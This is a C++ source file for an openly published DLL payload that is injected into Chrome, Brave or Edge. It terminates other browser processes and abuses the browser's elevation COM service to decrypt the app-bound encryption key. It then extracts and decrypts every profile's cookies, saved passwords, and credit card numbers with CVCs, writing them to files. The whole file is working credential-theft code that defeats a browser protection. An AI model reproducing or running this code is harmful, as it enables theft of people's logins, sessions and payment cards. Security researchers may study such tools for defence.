// chrome_decrypt.cpp
// v0.12.0 (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include <Windows.h>
#include <ShlObj.h>
#include <wrl/client.h>
#include <bcrypt.h>
#include <Wincrypt.h>

#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <tlhelp32.h>
#include <string>
#include <algorithm>
#include <memory>
#include <optional>
#include <stdexcept>
#include <filesystem>
#include <functional>
#include <any>
#include <unordered_map>

#include "reflective_loader.h"
#include "sqlite3.h"

#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace fs = std::filesystem;

enum class ProtectionLevel
{
    None = 0,
    PathValidationOld = 1,
    PathValidation = 2,
    Max = 3
};
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IOriginalBaseElevator : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR *, const WCHAR *, const WCHAR *, const WCHAR *, DWORD, ULONG_PTR *) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR *, DWORD *) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR *, DWORD *) = 0;
};
MIDL_INTERFACE("E12B779C-CDB8-4F19-95A0-9CA19B31A8F6")
IEdgeElevatorBase_Placeholder : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod1_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod2_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod3_Unknown(void) = 0;
};
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IEdgeIntermediateElevator : public IEdgeElevatorBase_Placeholder
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR *, const WCHAR *, const WCHAR *, const WCHAR *, DWORD, ULONG_PTR *) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR *, DWORD *) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR *, DWORD *) = 0;
};
MIDL_INTERFACE("C9C2B807-7731-4F34-81B7-44FF7779522B")
IEdgeElevatorFinal : public IEdgeIntermediateElevator{};

namespace Payload
{

    namespace Utils
    {
        fs::path GetLocalAppDataPath()
        {
            PWSTR path = nullptr;
            if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path)))
            {
                fs::path result = path;
                CoTaskMemFree(path);
                return result;
            }
            throw std::runtime_error("Failed to get Local AppData path.");
        }

        std::optional<std::vector<uint8_t>> Base64Decode(const std::string &input)
        {
            DWORD size = 0;
            if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr))
                return std::nullopt;
            std::vector<uint8_t> data(size);
            if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr))
                return std::nullopt;
            return data;
        }

        std::string BytesToHexString(const std::vector<uint8_t> &bytes)
        {
            std::ostringstream oss;
            oss << std::hex << std::setfill('0');
            for (uint8_t byte : bytes)
                oss << std::setw(2) << static_cast<int>(byte);
            return oss.str();
        }

        std::string EscapeJson(const std::string &s)
        {
            std::ostringstream o;
            for (char c : s)
            {
                switch (c)
                {
                case '"':
                    o << "\\\"";
                    break;
                case '\\':
                    o << "\\\\";
                    break;
                case '\b':
                    o << "\\b";
                    break;
                case '\f':
                    o << "\\f";
                    break;
                case '\n':
                    o << "\\n";
                    break;
                case '\r':
                    o << "\\r";
                    break;
                case '\t':
                    o << "\\t";
                    break;
                default:
                    if ('\x00' <= c && c <= '\x1f')
                    {
                        o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << static_cast<int>(c);
                    }
                    else
                    {
                        o << c;
                    }
                }
            }
            return o.str();
        }
    }

    namespace Browser
    {
        struct Config
        {
            std::string name;
            std::wstring processName;
            CLSID clsid;
            IID iid;
            fs::path userDataSubPath;
        };

        const std::unordered_map<std::string, Config> &GetConfigs()
        {
            static const std::unordered_map<std::string, Config> browser_configs = {
                {"chrome", {"Chrome", L"chrome.exe", {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}, {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}, fs::path("Google") / "Chrome" / "User Data"}},
                {"brave", {"Brave", L"brave.exe", {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}}, {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}}, fs::path("BraveSoftware") / "Brave-Browser" / "User Data"}},
                {"edge", {"Edge", L"msedge.exe", {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}, {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}}, fs::path("Microsoft") / "Edge" / "User Data"}}};
            return browser_configs;
        }

        Config GetConfigForCurrentProcess()
        {
            char exePath[MAX_PATH] = {0};
            GetModuleFileNameA(NULL, exePath, MAX_PATH);
            std::string processName = fs::path(exePath).filename().string();
            std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);

            const auto &configs = GetConfigs();
            if (processName == "chrome.exe")
                return configs.at("chrome");
            if (processName == "brave.exe")
                return configs.at("brave");
            if (processName == "msedge.exe")
                return configs.at("edge");

            throw std::runtime_error("Unsupported host process: " + processName);
        }

        void KillProcesses(const std::wstring &processName)
        {
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snap == INVALID_HANDLE_VALUE)
                return;

            auto snapCloser = [](HANDLE h)
            { if (h != INVALID_HANDLE_VALUE) CloseHandle(h); };
            std::unique_ptr<void, decltype(snapCloser)> snapGuard(snap, snapCloser);

            PROCESSENTRY32W pe;
            pe.dwSize = sizeof(pe);
            if (Process32FirstW(snap, &pe))
            {
                do
                {
                    if (processName == pe.szExeFile)
                    {
                        if (pe.th32ProcessID != GetCurrentProcessId())
                        {
                            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                            if (hProcess)
                            {
                                TerminateProcess(hProcess, 0);
                                CloseHandle(hProcess);
                            }
                        }
                    }
                } while (Process32NextW(snap, &pe));
            }
        }
    }

    namespace Crypto
    {
        constexpr size_t KEY_SIZE = 32;
        constexpr size_t GCM_IV_LENGTH = 12;
        constexpr size_t GCM_TAG_LENGTH = 16;
        const uint8_t KEY_PREFIX[] = {'A', 'P', 'P', 'B'};
        const std::string V20_PREFIX = "v20";

        std::vector<uint8_t> DecryptGcm(const std::vector<uint8_t> &key, const std::vector<uint8_t> &blob)
        {
            if (blob.size() <= (V20_PREFIX.length() + GCM_IV_LENGTH + GCM_TAG_LENGTH) || memcmp(blob.data(), V20_PREFIX.c_str(), V20_PREFIX.length()) != 0)
            {
                throw std::runtime_error("GCM blob is invalid.");
            }

            BCRYPT_ALG_HANDLE hAlg = nullptr;
            BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
            auto algCloser = [](BCRYPT_ALG_HANDLE h)
            { if(h) BCryptCloseAlgorithmProvider(h,0); };
            std::unique_ptr<void, decltype(algCloser)> algGuard(hAlg, algCloser);

            BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

            BCRYPT_KEY_HANDLE hKey = nullptr;
            BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);
            auto keyCloser = [](BCRYPT_KEY_HANDLE h)
            { if(h) BCryptDestroyKey(h); };
            std::unique_ptr<void, decltype(keyCloser)> keyGuard(hKey, keyCloser);

            const uint8_t *iv = blob.data() + V20_PREFIX.length();
            const uint8_t *ct = iv + GCM_IV_LENGTH;
            const uint8_t *tag = blob.data() + blob.size() - GCM_TAG_LENGTH;
            ULONG ct_len = static_cast<ULONG>(blob.size() - V20_PREFIX.length() - GCM_IV_LENGTH - GCM_TAG_LENGTH);

            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
            BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
            authInfo.pbNonce = (PUCHAR)iv;
            authInfo.cbNonce = GCM_IV_LENGTH;
            authInfo.pbTag = (PUCHAR)tag;
            authInfo.cbTag = GCM_TAG_LENGTH;

            std::vector<uint8_t> plain(ct_len > 0 ? ct_len : 1);
            ULONG outLen = 0;
            NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, &authInfo, nullptr, 0, plain.data(), (ULONG)plain.size(), &outLen, 0);
            if (!NT_SUCCESS(status))
                throw std::runtime_error("BCryptDecrypt failed.");

            plain.resize(outLen);
            return plain;
        }

        std::vector<uint8_t> GetEncryptedMasterKey(const fs::path &localStatePath)
        {
            std::ifstream f(localStatePath, std::ios::binary);
            if (!f)
                throw std::runtime_error("Could not open Local State file.");

            std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            const std::string tag = "\"app_bound_encrypted_key\":\"";
            size_t pos = content.find(tag);
            if (pos == std::string::npos)
                throw std::runtime_error("app_bound_encrypted_key not found.");

            pos += tag.length();
            size_t end_pos = content.find('"', pos);
            if (end_pos == std::string::npos)
                throw std::runtime_error("Malformed app_bound_encrypted_key.");

            auto optDecoded = Utils::Base64Decode(content.substr(pos, end_pos - pos));
            if (!optDecoded)
                throw std::runtime_error("Base64 decoding of key failed.");

            auto &decodedData = *optDecoded;
            if (decodedData.size() < sizeof(KEY_PREFIX) || memcmp(decodedData.data(), KEY_PREFIX, sizeof(KEY_PREFIX)) != 0)
            {
                throw std::runtime_error("Key prefix validation failed.");
            }
            return {decodedData.begin() + sizeof(KEY_PREFIX), decodedData.end()};
        }
    }

    namespace Data
    {
        struct ExtractionConfig
        {
            fs::path dbRelativePath;
            std::string outputFileName;
            std::string sqlQuery;
            std::function<std::optional<std::any>(sqlite3 *)> preQuerySetup;
            std::function<std::optional<std::string>(sqlite3_stmt *, const std::vector<uint8_t> &, const std::any &)> jsonFormatter;
        };

        const std::vector<ExtractionConfig> &GetExtractionConfigs()
        {
            static const std::vector<ExtractionConfig> configs = {
                {
                 fs::path("Network") / "Cookies", "cookies", "SELECT host_key, name, encrypted_value FROM cookies;",
                 nullptr,
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 2));
                     if (!blob)
                         return std::nullopt;
                     try
                     {
                         auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 2)});
                         constexpr size_t value_offset = 32;
                         if (plain.size() <= value_offset)
                             return std::nullopt;
                         std::string val(reinterpret_cast<char *>(plain.data() + value_offset), plain.size() - value_offset);
                         return "  {\"host\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) +
                                "\",\"name\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
                                "\",\"value\":\"" + Utils::EscapeJson(val) + "\"}";
                     }
                     catch (...)
                     {
                         return std::nullopt;
                     }
                 }},
                {
                 "Login Data", "passwords", "SELECT origin_url, username_value, password_value FROM logins;",
                 nullptr,
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 2));
                     if (!blob)
                         return std::nullopt;
                     try
                     {
                         auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 2)});
                         return "  {\"origin\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) +
                                "\",\"username\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
                                "\",\"password\":\"" + Utils::EscapeJson({(char *)plain.data(), plain.size()}) + "\"}";
                     }
                     catch (...)
                     {
                         return std::nullopt;
                     }
                 }},
                {
                 "Web Data", "payments", "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;",
                 [](sqlite3 *db) -> std::optional<std::any>
                 {
                     auto cvcMap = std::make_shared<std::unordered_map<std::string, std::vector<uint8_t>>>();
                     sqlite3_stmt *stmt = nullptr;
                     if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc;", -1, &stmt, nullptr) != SQLITE_OK)
                         return cvcMap;
                     while (sqlite3_step(stmt) == SQLITE_ROW)
                     {
                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
                         const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 1);
                         if (guid && blob)
                             (*cvcMap)[guid] = {blob, blob + sqlite3_column_bytes(stmt, 1)};
                     }
                     sqlite3_finalize(stmt);
                     return cvcMap;
                 },
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     const auto &cvcMap = std::any_cast<std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>>>(state);
                     std::string card_num_str, cvc_str;
                     try
                     {
                         const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 4);
                         if (blob)
                         {
                             auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 4)});
                             card_num_str.assign((char *)plain.data(), plain.size());
                         }
                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
                         if (guid && cvcMap->count(guid))
                         {
                             auto plain = Crypto::DecryptGcm(key, cvcMap->at(guid));
                             cvc_str.assign((char *)plain.data(), plain.size());
                         }
                     }
                     catch (...)
                     {
                     }
                     return "  {\"name_on_card\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
                            "\",\"expiration_month\":" + std::to_string(sqlite3_column_int(stmt, 2)) +
                            ",\"expiration_year\":" + std::to_string(sqlite3_column_int(stmt, 3)) +
                            ",\"card_number\":\"" + Utils::EscapeJson(card_num_str) +
                            "\",\"cvc\":\"" + Utils::EscapeJson(cvc_str) + "\"}";
                 }}};
            return configs;
        }
    }

    class DecryptionSession
    {
    public:
        DecryptionSession(LPVOID lpPipeNamePointer) : m_config(Browser::GetConfigForCurrentProcess())
        {
            InitializePipe(lpPipeNamePointer);
            ReadPipeParameters();
        }

        void Run()
        {
            Log("[*] Decryption process started for " + m_config.name);
            Browser::KillProcesses(m_config.processName);
            Sleep(2000);

            InitializeCom();
            auto aesKey = DecryptMasterKey();
            Log("[+] Decrypted AES Key: " + Utils::BytesToHexString(aesKey));

            ExtractAllData(aesKey);
        }

        void Log(const std::string &message)
        {
            if (m_pipe != INVALID_HANDLE_VALUE)
            {
                DWORD bytesWritten = 0;
                WriteFile(m_pipe, message.c_str(), static_cast<DWORD>(message.length() + 1), &bytesWritten, nullptr);
            }
        }

        ~DecryptionSession()
        {
            Log("[*] Decryption process finished.");
            if (m_pipe != INVALID_HANDLE_VALUE)
            {
                Log("__DLL_PIPE_COMPLETION_SIGNAL__");
                FlushFileBuffers(m_pipe);
                CloseHandle(m_pipe);
            }
            if (m_comInitialized)
                CoUninitialize();
        }

    private:
        HANDLE m_pipe = INVALID_HANDLE_VALUE;
        bool m_verbose = false;
        bool m_comInitialized = false;
        fs::path m_outputPath;
        Browser::Config m_config;

        void InitializePipe(LPVOID lpPipeNamePointer)
        {
            if (!lpPipeNamePointer)
                throw std::runtime_error("Pipe name pointer is null.");
            m_pipe = CreateFileW((LPCWSTR)lpPipeNamePointer, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
            if (m_pipe == INVALID_HANDLE_VALUE)
                throw std::runtime_error("Failed to connect to named pipe.");
        }

        void ReadPipeParameters()
        {
            char buffer[MAX_PATH + 1] = {0};
            DWORD bytesRead = 0;
            ReadFile(m_pipe, buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
            m_verbose = (std::string(buffer) == "VERBOSE_TRUE");

            ReadFile(m_pipe, buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
            buffer[bytesRead] = '\0';
            m_outputPath = buffer;
        }

        void InitializeCom()
        {
            if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)))
            {
                throw std::runtime_error("Failed to initialize COM.");
            }
            m_comInitialized = true;
            Log("[+] COM library initialized (APARTMENTTHREADED).");
        }

        std::vector<uint8_t> DecryptMasterKey()
        {
            fs::path localStatePath = Utils::GetLocalAppDataPath() / m_config.userDataSubPath / "Local State";
            Log("[+] Reading Local State file: " + localStatePath.u8string());
            auto encryptedKeyBlob = Crypto::GetEncryptedMasterKey(localStatePath);

            BSTR bstrEncKey = SysAllocStringByteLen(reinterpret_cast<const char *>(encryptedKeyBlob.data()), (UINT)encryptedKeyBlob.size());
            if (!bstrEncKey)
                throw std::runtime_error("SysAllocStringByteLen for encrypted key failed.");
            auto bstrEncGuard = std::unique_ptr<OLECHAR[], decltype(&SysFreeString)>(bstrEncKey, &SysFreeString);

            BSTR bstrPlainKey = nullptr;
            auto bstrPlainGuard = std::unique_ptr<OLECHAR[], decltype(&SysFreeString)>(nullptr, &SysFreeString);

            HRESULT hr = E_FAIL;
            DWORD comErr = 0;

            if (m_config.name == "Edge")
            {
                Microsoft::WRL::ComPtr<IEdgeElevatorFinal> elevator;
                hr = CoCreateInstance(m_config.clsid, nullptr, CLSCTX_LOCAL_SERVER, m_config.iid, &elevator);
                if (SUCCEEDED(hr))
                {
                    CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                    hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
                }
            }
            else
            {
                Microsoft::WRL::ComPtr<IOriginalBaseElevator> elevator;
                hr = CoCreateInstance(m_config.clsid, nullptr, CLSCTX_LOCAL_SERVER, m_config.iid, &elevator);
                if (SUCCEEDED(hr))
                {
                    CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                    hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
                }
            }
            bstrPlainGuard.reset(bstrPlainKey);

            if (FAILED(hr) || !bstrPlainKey || SysStringByteLen(bstrPlainKey) != Crypto::KEY_SIZE)
            {
                std::ostringstream oss;
                oss << "IElevator->DecryptData failed. HRESULT: 0x" << std::hex << hr;
                throw std::runtime_error(oss.str());
            }

            std::vector<uint8_t> aesKey(Crypto::KEY_SIZE);
            memcpy(aesKey.data(), bstrPlainKey, Crypto::KEY_SIZE);
            return aesKey;
        }

        void ExtractAllData(const std::vector<uint8_t> &aesKey)
        {
            fs::path userDataRoot = Utils::GetLocalAppDataPath() / m_config.userDataSubPath;
            std::vector<fs::path> profilePaths;
            if (fs::exists(userDataRoot / "Default"))
                profilePaths.push_back(userDataRoot / "Default");
            try
            {
                for (const auto &entry : fs::directory_iterator(userDataRoot))
                {
                    if (entry.is_directory() && entry.path().filename().string().rfind("Profile ", 0) == 0)
                    {
                        profilePaths.push_back(entry.path());
                    }
                }
            }
            catch (...)
            {
            }

            if (profilePaths.empty() && (fs::exists(userDataRoot / "Network") || fs::exists(userDataRoot / "Login Data")))
            {
                profilePaths.push_back(userDataRoot);
            }

            for (const auto &profilePath : profilePaths)
            {
                Log("[*] Processing profile: " + profilePath.filename().u8string());
                for (const auto &dataCfg : Data::GetExtractionConfigs())
                {
                    ExtractDataFromProfile(profilePath, dataCfg, aesKey);
                }
            }
        }

        void ExtractDataFromProfile(const fs::path &profilePath, const Data::ExtractionConfig &dataCfg, const std::vector<uint8_t> &aesKey)
        {
            fs::path dbPath = profilePath / dataCfg.dbRelativePath;
            if (!fs::exists(dbPath))
                return;

            sqlite3 *db = nullptr;
            if (sqlite3_open_v2(dbPath.string().c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK)
            {
                if (db)
                    sqlite3_close_v2(db);
                return;
            }
            auto dbCloser = [](sqlite3 *d)
            { if(d) sqlite3_close_v2(d); };
            std::unique_ptr<sqlite3, decltype(dbCloser)> dbGuard(db, dbCloser);

            std::any preQueryState;
            if (dataCfg.preQuerySetup)
            {
                if (auto state = dataCfg.preQuerySetup(dbGuard.get()))
                    preQueryState = *state;
            }

            sqlite3_stmt *stmt = nullptr;
            if (sqlite3_prepare_v2(dbGuard.get(), dataCfg.sqlQuery.c_str(), -1, &stmt, nullptr) != SQLITE_OK)
                return;
            auto stmtFinalizer = [](sqlite3_stmt *s)
            { if(s) sqlite3_finalize(s); };
            std::unique_ptr<sqlite3_stmt, decltype(stmtFinalizer)> stmtGuard(stmt, stmtFinalizer);

            fs::path outFilePath = m_outputPath / m_config.name / profilePath.filename() / (dataCfg.outputFileName + ".txt");
            std::error_code ec;
            fs::create_directories(outFilePath.parent_path(), ec);
            std::ofstream out(outFilePath, std::ios::trunc);
            if (!out)
                return;

            out << "[\n";
            bool first = true;
            int count = 0;
            while (sqlite3_step(stmtGuard.get()) == SQLITE_ROW)
            {
                if (auto jsonEntry = dataCfg.jsonFormatter(stmtGuard.get(), aesKey, preQueryState))
                {
                    if (!first)
                        out << ",\n";
                    first = false;
                    out << *jsonEntry;
                    count++;
                }
            }
            out << "\n]\n";
            if (count > 0)
                Log("     [*] " + std::to_string(count) + " " + dataCfg.outputFileName + " extracted to " + outFilePath.u8string());
        }
    };
}

struct ThreadParams
{
    HMODULE hModule_dll;
    LPVOID lpPipeNamePointerFromInjector;
};

DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
{
    auto params = std::unique_ptr<ThreadParams>(static_cast<ThreadParams *>(lpParam));
    HMODULE hModule = params->hModule_dll;
    LPVOID pipeNamePtr = params->lpPipeNamePointerFromInjector;

    std::unique_ptr<Payload::DecryptionSession> session = nullptr;
    try
    {
        session = std::make_unique<Payload::DecryptionSession>(pipeNamePtr);
        session->Run();
    }
    catch (const std::exception &e)
    {
        if (session)
        {
            session->Log("[-] CRITICAL ERROR: " + std::string(e.what()));
        }
    }

    session.reset();
    FreeLibraryAndExitThread(hModule, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);

        auto params = new (std::nothrow) ThreadParams{hModule, lpReserved};
        if (!params)
            return TRUE;

        HANDLE hThread = CreateThread(NULL, 0, DecryptionThreadWorker, params, 0, NULL);
        if (hThread)
        {
            CloseHandle(hThread);
        }
        else
        {
            delete params;
        }
    }
    return TRUE;
}
